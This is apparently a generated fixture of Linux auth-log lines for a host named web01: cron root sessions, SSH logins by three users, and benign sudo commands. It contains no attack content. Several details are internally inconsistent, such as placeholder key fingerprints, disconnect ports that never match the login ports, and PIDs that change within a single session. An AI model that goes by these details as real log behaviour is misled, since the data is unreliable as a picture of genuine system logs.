+Oct 15 08:30:58 web01 CRON[46636]: pam_unix(cron:session): session closed for user root
+Oct 15 08:40:38 web01 CRON[28436]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 08:40:39 web01 CRON[35193]: pam_unix(cron:session): session closed for user root
+Oct 15 08:50:26 web01 CRON[54417]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 08:50:27 web01 CRON[27241]: pam_unix(cron:session): session closed for user root
+Oct 15 09:00:06 web01 CRON[2741]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 09:00:07 web01 CRON[58900]: pam_unix(cron:session): session closed for user root
+Oct 15 09:10:17 web01 CRON[20291]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 09:10:18 web01 CRON[37254]: pam_unix(cron:session): session closed for user root
+Oct 15 09:20:44 web01 CRON[7359]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 09:20:45 web01 CRON[9320]: pam_unix(cron:session): session closed for user root
+Oct 15 09:30:47 web01 CRON[50159]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 09:30:48 web01 CRON[58555]: pam_unix(cron:session): session closed for user root
+Oct 15 09:40:30 web01 CRON[49866]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 09:40:31 web01 CRON[41506]: pam_unix(cron:session): session closed for user root
+Oct 15 09:50:26 web01 CRON[42431]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 09:50:27 web01 CRON[20868]: pam_unix(cron:session): session closed for user root
+Oct 15 09:53:09 web01 sshd[62586]: Accepted publickey for alice from 10.0.0.27 port 41634 ssh2: ED25519 SHA256:x
+Oct 15 09:53:10 web01 systemd-logind[42341]: New session 4237 of user alice.
+Oct 15 10:00:20 web01 CRON[56758]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 10:00:21 web01 CRON[9260]: pam_unix(cron:session): session closed for user root
+Oct 15 10:10:53 web01 CRON[7241]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 10:10:54 web01 CRON[2989]: pam_unix(cron:session): session closed for user root
+Oct 15 10:20:04 web01 CRON[26099]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 10:20:05 web01 CRON[14292]: pam_unix(cron:session): session closed for user root
+Oct 15 10:23:09 web01 sshd[48935]: Received disconnect from 10.0.0.27 port 54662:11: disconnected by user
+Oct 15 10:30:06 web01 CRON[52328]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 10:30:07 web01 CRON[49424]: pam_unix(cron:session): session closed for user root
+Oct 15 10:40:05 web01 CRON[4777]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 10:40:06 web01 CRON[39052]: pam_unix(cron:session): session closed for user root
+Oct 15 10:43:07 web01 sshd[36761]: Accepted publickey for bob from 10.0.0.22 port 43814 ssh2: ED25519 SHA256:x
+Oct 15 10:43:08 web01 systemd-logind[5869]: New session 1967 of user bob.
+Oct 15 10:50:18 web01 CRON[14720]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 10:50:19 web01 CRON[35625]: pam_unix(cron:session): session closed for user root
+Oct 15 11:00:31 web01 CRON[19414]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 11:00:32 web01 CRON[53521]: pam_unix(cron:session): session closed for user root
+Oct 15 11:10:58 web01 CRON[13559]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 11:10:59 web01 CRON[46364]: pam_unix(cron:session): session closed for user root
+Oct 15 11:13:07 web01 sshd[26395]: Received disconnect from 10.0.0.22 port 38856:11: disconnected by user
+Oct 15 11:20:47 web01 CRON[7247]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 11:20:48 web01 CRON[2783]: pam_unix(cron:session): session closed for user root
+Oct 15 11:30:15 web01 CRON[9419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 11:30:16 web01 CRON[25112]: pam_unix(cron:session): session closed for user root
+Oct 15 11:40:04 web01 CRON[7205]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 11:40:05 web01 CRON[29776]: pam_unix(cron:session): session closed for user root
+Oct 15 11:44:26 web01 sshd[37692]: Failed password for alice from 10.0.0.32 port 47881 ssh2
+Oct 15 11:44:31 web01 sshd[25725]: Accepted publickey for alice from 10.0.0.32 port 40551 ssh2: ED25519 SHA256:x
+Oct 15 11:44:32 web01 systemd-logind[29807]: New session 3461 of user alice.
+Oct 15 11:46:31 web01 sudo: alice : TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 15 11:48:16 web01 sshd[3117]: Accepted publickey for alice from 10.0.0.13 port 39968 ssh2: ED25519 SHA256:x
+Oct 15 11:48:17 web01 systemd-logind[29491]: New session 6315 of user alice.
+Oct 15 11:50:01 web01 CRON[33587]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 11:50:02 web01 CRON[53617]: pam_unix(cron:session): session closed for user root
+Oct 15 11:51:07 web01 sshd[48535]: Accepted publickey for alice from 10.0.0.31 port 49427 ssh2: ED25519 SHA256:x
+Oct 15 11:51:08 web01 systemd-logind[63450]: New session 4536 of user alice.
+Oct 15 11:53:07 web01 sudo: alice : TTY=pts/3 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 15 12:00:54 web01 CRON[47712]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 12:00:55 web01 CRON[56728]: pam_unix(cron:session): session closed for user root
+Oct 15 12:10:57 web01 CRON[1746]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 12:10:58 web01 CRON[23596]: pam_unix(cron:session): session closed for user root
+Oct 15 12:14:31 web01 sshd[21541]: Received disconnect from 10.0.0.32 port 46953:11: disconnected by user
+Oct 15 12:18:16 web01 sshd[63264]: Received disconnect from 10.0.0.13 port 48414:11: disconnected by user
+Oct 15 12:20:16 web01 CRON[43571]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 12:20:17 web01 CRON[43059]: pam_unix(cron:session): session closed for user root
+Oct 15 12:21:07 web01 sshd[35864]: Received disconnect from 10.0.0.31 port 33375:11: disconnected by user
+Oct 15 12:30:49 web01 CRON[55081]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 12:30:50 web01 CRON[44459]: pam_unix(cron:session): session closed for user root
+Oct 15 12:40:21 web01 CRON[53100]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 12:40:22 web01 CRON[47258]: pam_unix(cron:session): session closed for user root
+Oct 15 12:47:48 web01 sshd[42549]: Accepted publickey for alice from 10.0.0.32 port 56178 ssh2: ED25519 SHA256:x
+Oct 15 12:47:49 web01 systemd-logind[19254]: New session 7120 of user alice.
+Oct 15 12:50:37 web01 CRON[64583]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 12:50:38 web01 CRON[47144]: pam_unix(cron:session): session closed for user root
+Oct 15 13:00:16 web01 CRON[37849]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 13:00:17 web01 CRON[55706]: pam_unix(cron:session): session closed for user root
+Oct 15 13:10:08 web01 CRON[12097]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 13:10:09 web01 CRON[38088]: pam_unix(cron:session): session closed for user root
+Oct 15 13:17:36 web01 sshd[53725]: Accepted publickey for bob from 10.0.0.40 port 34480 ssh2: ED25519 SHA256:x
+Oct 15 13:17:37 web01 systemd-logind[24958]: New session 4241 of user bob.
+Oct 15 13:17:48 web01 sshd[49860]: Received disconnect from 10.0.0.32 port 35607:11: disconnected by user
+Oct 15 13:19:36 web01 sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Oct 15 13:20:24 web01 CRON[3635]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 13:20:25 web01 CRON[5852]: pam_unix(cron:session): session closed for user root
+Oct 15 13:30:28 web01 CRON[11246]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 13:30:29 web01 CRON[17557]: pam_unix(cron:session): session closed for user root
+Oct 15 13:40:19 web01 CRON[63232]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 13:40:20 web01 CRON[11299]: pam_unix(cron:session): session closed for user root
+Oct 15 13:43:24 web01 sshd[17999]: Accepted publickey for carol from 10.0.0.33 port 35116 ssh2: ED25519 SHA256:x
+Oct 15 13:43:25 web01 systemd-logind[23547]: New session 8005 of user carol.
+Oct 15 13:44:50 web01 sshd[8476]: Accepted publickey for carol from 10.0.0.15 port 37833 ssh2: ED25519 SHA256:x
+Oct 15 13:44:51 web01 systemd-logind[9765]: New session 1605 of user carol.
+Oct 15 13:46:50 web01 sudo: carol : TTY=pts/1 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 15 13:47:36 web01 sshd[9133]: Received disconnect from 10.0.0.40 port 54695:11: disconnected by user
+Oct 15 13:50:40 web01 CRON[13160]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 13:50:41 web01 CRON[8380]: pam_unix(cron:session): session closed for user root
+Oct 15 14:00:18 web01 CRON[34007]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 14:00:19 web01 CRON[6860]: pam_unix(cron:session): session closed for user root
+Oct 15 14:10:19 web01 CRON[11931]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 14:10:20 web01 CRON[18140]: pam_unix(cron:session): session closed for user root
+Oct 15 14:13:24 web01 sshd[62987]: Received disconnect from 10.0.0.33 port 55699:11: disconnected by user
+Oct 15 14:14:50 web01 sshd[31984]: Received disconnect from 10.0.0.15 port 34996:11: disconnected by user
+Oct 15 14:20:34 web01 CRON[36002]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 14:20:35 web01 CRON[35897]: pam_unix(cron:session): session closed for user root
+Oct 15 14:30:14 web01 CRON[25468]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 14:30:15 web01 CRON[64140]: pam_unix(cron:session): session closed for user root
+Oct 15 14:40:48 web01 CRON[37776]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 14:40:49 web01 CRON[32180]: pam_unix(cron:session): session closed for user root
+Oct 15 14:42:11 web01 sshd[29602]: Accepted publickey for carol from 10.0.0.13 port 37722 ssh2: ED25519 SHA256:x
+Oct 15 14:42:12 web01 systemd-logind[6269]: New session 7431 of user carol.
+Oct 15 14:44:11 web01 sudo: carol : TTY=pts/3 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Oct 15 14:50:45 web01 CRON[31213]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 14:50:46 web01 CRON[57287]: pam_unix(cron:session): session closed for user root
+Oct 15 15:00:59 web01 CRON[1883]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 15:01:00 web01 CRON[47486]: pam_unix(cron:session): session closed for user root
+Oct 15 15:10:15 web01 CRON[20120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 15:10:16 web01 CRON[38950]: pam_unix(cron:session): session closed for user root
+Oct 15 15:12:11 web01 sshd[9331]: Received disconnect from 10.0.0.13 port 54471:11: disconnected by user
+Oct 15 15:20:13 web01 CRON[60152]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 15:20:14 web01 CRON[22445]: pam_unix(cron:session): session closed for user root
+Oct 15 15:30:56 web01 CRON[45887]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 15:30:57 web01 CRON[48251]: pam_unix(cron:session): session closed for user root
+Oct 15 15:40:07 web01 CRON[18612]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 15:40:08 web01 CRON[22398]: pam_unix(cron:session): session closed for user root
+Oct 15 15:50:49 web01 CRON[1224]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 15:50:50 web01 CRON[58733]: pam_unix(cron:session): session closed for user root
+Oct 15 15:57:58 web01 sshd[62540]: Accepted publickey for carol from 10.0.0.16 port 54041 ssh2: ED25519 SHA256:x
+Oct 15 15:57:59 web01 systemd-logind[54936]: New session 8087 of user carol.
+Oct 15 15:59:58 web01 sudo: carol : TTY=pts/5 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct 15 16:00:51 web01 CRON[37953]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 16:00:52 web01 CRON[2103]: pam_unix(cron:session): session closed for user root
+Oct 15 16:07:39 web01 sshd[36398]: Accepted publickey for bob from 10.0.0.27 port 54857 ssh2: ED25519 SHA256:x
+Oct 15 16:07:40 web01 systemd-logind[63728]: New session 1262 of user bob.
+Oct 15 16:10:02 web01 CRON[7421]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 16:10:03 web01 CRON[52813]: pam_unix(cron:session): session closed for user root
+Oct 15 16:20:54 web01 CRON[24179]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 16:20:55 web01 CRON[19465]: pam_unix(cron:session): session closed for user root
+Oct 15 16:27:58 web01 sshd[64388]: Received disconnect from 10.0.0.16 port 40119:11: disconnected by user
+Oct 15 16:30:22 web01 CRON[30454]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 16:30:23 web01 CRON[32875]: pam_unix(cron:session): session closed for user root
+Oct 15 16:37:39 web01 sshd[64204]: Received disconnect from 10.0.0.27 port 57513:11: disconnected by user
+Oct 15 16:40:37 web01 CRON[43726]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 16:40:38 web01 CRON[54230]: pam_unix(cron:session): session closed for user root
+Oct 15 16:50:21 web01 CRON[47383]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 16:50:22 web01 CRON[36539]: pam_unix(cron:session): session closed for user root
+Oct 15 17:00:34 web01 CRON[57775]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 17:00:35 web01 CRON[24218]: pam_unix(cron:session): session closed for user root
+Oct 15 17:10:47 web01 CRON[48285]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 17:10:48 web01 CRON[61087]: pam_unix(cron:session): session closed for user root
+Oct 15 17:20:16 web01 CRON[21448]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 17:20:17 web01 CRON[10942]: pam_unix(cron:session): session closed for user root
+Oct 15 17:30:37 web01 CRON[36898]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 17:30:38 web01 CRON[62011]: pam_unix(cron:session): session closed for user root
+Oct 15 17:40:40 web01 CRON[16029]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 17:40:41 web01 CRON[48515]: pam_unix(cron:session): session closed for user root
+Oct 15 17:50:09 web01 CRON[50444]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 17:50:10 web01 CRON[6010]: pam_unix(cron:session): session closed for user root
+Oct 15 18:00:51 web01 CRON[8607]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 18:00:52 web01 CRON[8524]: pam_unix(cron:session): session closed for user root
+Oct 15 18:10:55 web01 CRON[49337]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 18:10:56 web01 CRON[62202]: pam_unix(cron:session): session closed for user root
+Oct 15 18:20:22 web01 CRON[37291]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 18:20:23 web01 CRON[1722]: pam_unix(cron:session): session closed for user root
+Oct 15 18:30:20 web01 CRON[62959]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 18:30:21 web01 CRON[48610]: pam_unix(cron:session): session closed for user root
+Oct 15 18:40:31 web01 CRON[42085]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 18:40:32 web01 CRON[52145]: pam_unix(cron:session): session closed for user root
+Oct 15 18:50:42 web01 CRON[61505]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 18:50:43 web01 CRON[23639]: pam_unix(cron:session): session closed for user root
+Oct 15 19:00:39 web01 CRON[31405]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 19:00:40 web01 CRON[62035]: pam_unix(cron:session): session closed for user root
+Oct 15 19:10:35 web01 CRON[18828]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 19:10:36 web01 CRON[49519]: pam_unix(cron:session): session closed for user root
+Oct 15 19:20:15 web01 CRON[4137]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 19:20:16 web01 CRON[41134]: pam_unix(cron:session): session closed for user root
+Oct 15 19:30:45 web01 CRON[47384]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 19:30:46 web01 CRON[36132]: pam_unix(cron:session): session closed for user root
+Oct 15 19:40:47 web01 CRON[29242]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 19:40:48 web01 CRON[61943]: pam_unix(cron:session): session closed for user root
+Oct 15 19:50:52 web01 CRON[33341]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 19:50:53 web01 CRON[51049]: pam_unix(cron:session): session closed for user root
+Oct 15 20:00:39 web01 CRON[42330]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 20:00:40 web01 CRON[20713]: pam_unix(cron:session): session closed for user root
+Oct 15 20:10:03 web01 CRON[52774]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 20:10:04 web01 CRON[8225]: pam_unix(cron:session): session closed for user root
+Oct 15 20:20:20 web01 CRON[37410]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 20:20:21 web01 CRON[25721]: pam_unix(cron:session): session closed for user root
+Oct 15 20:30:58 web01 CRON[26499]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 20:30:59 web01 CRON[47187]: pam_unix(cron:session): session closed for user root
+Oct 15 20:40:08 web01 CRON[46238]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 20:40:09 web01 CRON[63967]: pam_unix(cron:session): session closed for user root
+Oct 15 20:50:19 web01 CRON[36787]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 20:50:20 web01 CRON[56667]: pam_unix(cron:session): session closed for user root
+Oct 15 21:00:32 web01 CRON[63203]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 21:00:33 web01 CRON[3916]: pam_unix(cron:session): session closed for user root
+Oct 15 21:10:34 web01 CRON[57176]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 21:10:35 web01 CRON[10620]: pam_unix(cron:session): session closed for user root
+Oct 15 21:20:51 web01 CRON[55485]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 21:20:52 web01 CRON[58035]: pam_unix(cron:session): session closed for user root
+Oct 15 21:30:43 web01 CRON[17202]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 21:30:44 web01 CRON[51093]: pam_unix(cron:session): session closed for user root
+Oct 15 21:40:44 web01 CRON[37706]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 21:40:45 web01 CRON[53974]: pam_unix(cron:session): session closed for user root
+Oct 15 21:50:25 web01 CRON[35437]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 21:50:26 web01 CRON[14220]: pam_unix(cron:session): session closed for user root
+Oct 15 22:00:42 web01 CRON[46730]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 22:00:43 web01 CRON[16649]: pam_unix(cron:session): session closed for user root
+Oct 15 22:10:14 web01 CRON[58430]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 22:10:15 web01 CRON[31265]: pam_unix(cron:session): session closed for user root
+Oct 15 22:20:56 web01 CRON[44021]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 22:20:57 web01 CRON[44898]: pam_unix(cron:session): session closed for user root
+Oct 15 22:30:22 web01 CRON[10998]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 22:30:23 web01 CRON[32923]: pam_unix(cron:session): session closed for user root
+Oct 15 22:40:04 web01 CRON[26066]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 22:40:05 web01 CRON[25952]: pam_unix(cron:session): session closed for user root
+Oct 15 22:50:13 web01 CRON[3613]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 22:50:14 web01 CRON[24460]: pam_unix(cron:session): session closed for user root
+Oct 15 23:00:33 web01 CRON[19762]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 23:00:34 web01 CRON[14429]: pam_unix(cron:session): session closed for user root
+Oct 15 23:10:39 web01 CRON[63677]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 23:10:40 web01 CRON[29092]: pam_unix(cron:session): session closed for user root
+Oct 15 23:20:10 web01 CRON[64428]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 23:20:11 web01 CRON[39454]: pam_unix(cron:session): session closed for user root
+Oct 15 23:30:19 web01 CRON[19193]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 23:30:20 web01 CRON[37745]: pam_unix(cron:session): session closed for user root
+Oct 15 23:40:01 web01 CRON[13146]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 23:40:02 web01 CRON[1863]: pam_unix(cron:session): session closed for user root
+Oct 15 23:50:48 web01 CRON[25341]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 23:50:49 web01 CRON[62601]: pam_unix(cron:session): session closed for user root
+Oct 16 00:00:02 web01 CRON[46983]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 00:00:03 web01 CRON[8187]: pam_unix(cron:session): session closed for user root
+Oct 16 00:10:37 web01 CRON[45503]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 00:10:38 web01 CRON[7986]: pam_unix(cron:session): session closed for user root
+Oct 16 00:20:25 web01 CRON[30498]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 00:20:26 web01 CRON[3891]: pam_unix(cron:session): session closed for user root
+Oct 16 00:30:15 web01 CRON[23009]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 00:30:16 web01 CRON[37948]: pam_unix(cron:session): session closed for user root
+Oct 16 00:40:50 web01 CRON[60954]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 00:40:51 web01 CRON[10198]: pam_unix(cron:session): session closed for user root
+Oct 16 00:50:04 web01 CRON[18528]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 00:50:05 web01 CRON[46459]: pam_unix(cron:session): session closed for user root
+Oct 16 01:00:24 web01 CRON[17486]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 01:00:25 web01 CRON[4279]: pam_unix(cron:session): session closed for user root
+Oct 16 01:10:14 web01 CRON[7735]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 01:10:15 web01 CRON[6927]: pam_unix(cron:session): session closed for user root
+Oct 16 01:20:45 web01 CRON[13677]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 01:20:46 web01 CRON[48233]: pam_unix(cron:session): session closed for user root
+Oct 16 01:30:41 web01 CRON[13723]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 01:30:42 web01 CRON[35052]: pam_unix(cron:session): session closed for user root
+Oct 16 01:40:16 web01 CRON[42985]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 01:40:17 web01 CRON[46622]: pam_unix(cron:session): session closed for user root
+Oct 16 01:50:50 web01 CRON[32309]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 01:50:51 web01 CRON[64632]: pam_unix(cron:session): session closed for user root
+Oct 16 02:00:25 web01 CRON[12838]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 02:00:26 web01 CRON[4491]: pam_unix(cron:session): session closed for user root
+Oct 16 02:10:01 web01 CRON[10654]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 02:10:02 web01 CRON[20933]: pam_unix(cron:session): session closed for user root
+Oct 16 02:20:59 web01 CRON[15638]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 02:21:00 web01 CRON[33231]: pam_unix(cron:session): session closed for user root
+Oct 16 02:30:09 web01 CRON[23157]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 02:30:10 web01 CRON[53632]: pam_unix(cron:session): session closed for user root
+Oct 16 02:40:39 web01 CRON[53846]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 02:40:40 web01 CRON[12282]: pam_unix(cron:session): session closed for user root
+Oct 16 02:50:06 web01 CRON[32805]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 02:50:07 web01 CRON[33571]: pam_unix(cron:session): session closed for user root
+Oct 16 03:00:41 web01 CRON[34477]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 03:00:42 web01 CRON[50677]: pam_unix(cron:session): session closed for user root
+Oct 16 03:10:55 web01 CRON[31854]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 03:10:56 web01 CRON[50686]: pam_unix(cron:session): session closed for user root
+Oct 16 03:20:29 web01 CRON[36026]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 03:20:30 web01 CRON[41820]: pam_unix(cron:session): session closed for user root
+Oct 16 03:30:01 web01 CRON[17924]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 03:30:02 web01 CRON[31375]: pam_unix(cron:session): session closed for user root
+Oct 16 03:40:47 web01 CRON[45900]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 03:40:48 web01 CRON[54042]: pam_unix(cron:session): session closed for user root
+Oct 16 03:50:43 web01 CRON[29397]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 03:50:44 web01 CRON[23524]: pam_unix(cron:session): session closed for user root
+Oct 16 04:00:39 web01 CRON[49864]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 04:00:40 web01 CRON[5372]: pam_unix(cron:session): session closed for user root
+Oct 16 04:10:32 web01 CRON[43910]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 04:10:33 web01 CRON[24873]: pam_unix(cron:session): session closed for user root
+Oct 16 04:20:07 web01 CRON[45224]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 04:20:08 web01 CRON[32352]: pam_unix(cron:session): session closed for user root
+Oct 16 04:30:05 web01 CRON[45764]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 04:30:06 web01 CRON[4462]: pam_unix(cron:session): session closed for user root
+Oct 16 04:40:07 web01 CRON[24126]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 04:40:08 web01 CRON[23927]: pam_unix(cron:session): session closed for user root
+Oct 16 04:50:16 web01 CRON[37961]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 04:50:17 web01 CRON[47619]: pam_unix(cron:session): session closed for user root
+Oct 16 05:00:51 web01 CRON[24604]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 05:00:52 web01 CRON[35945]: pam_unix(cron:session): session closed for user root
+Oct 16 05:10:02 web01 CRON[18319]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 05:10:03 web01 CRON[35132]: pam_unix(cron:session): session closed for user root
+Oct 16 05:20:11 web01 CRON[9741]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 05:20:12 web01 CRON[5252]: pam_unix(cron:session): session closed for user root
+Oct 16 05:30:38 web01 CRON[59585]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 05:30:39 web01 CRON[8006]: pam_unix(cron:session): session closed for user root
+Oct 16 05:40:16 web01 CRON[7482]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 05:40:17 web01 CRON[32654]: pam_unix(cron:session): session closed for user root
+Oct 16 05:50:16 web01 CRON[30377]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 05:50:17 web01 CRON[51185]: pam_unix(cron:session): session closed for user root
+Oct 16 06:00:07 web01 CRON[59557]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 06:00:08 web01 CRON[61637]: pam_unix(cron:session): session closed for user root
